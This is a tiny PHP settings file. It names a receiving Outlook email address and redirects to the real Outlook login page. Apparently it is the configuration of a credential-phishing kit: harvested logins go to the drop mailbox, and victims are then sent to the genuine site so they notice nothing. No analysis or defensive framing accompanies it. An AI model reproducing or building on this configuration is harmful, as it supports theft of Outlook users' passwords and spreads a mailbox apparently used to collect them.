<?php 
$Receive_email="dtifleetservicesllc2@outlook.com ";
$redirect="https://outlook.live.com/";
?>